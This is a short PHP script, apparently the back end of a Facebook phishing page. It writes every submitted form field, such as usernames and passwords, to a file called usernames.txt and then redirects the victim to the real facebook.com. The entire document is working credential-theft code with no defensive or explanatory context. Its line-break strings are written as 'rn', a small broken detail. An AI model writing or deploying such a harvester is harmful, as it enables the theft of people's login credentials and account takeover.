_<?php
$url = 'http://www.facebook.com';
header( "Location: $url" );
$handle = fopen('usernames.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, 'rn');
}
fwrite($handle, 'rn');
fclose($handle);
exit;
?> _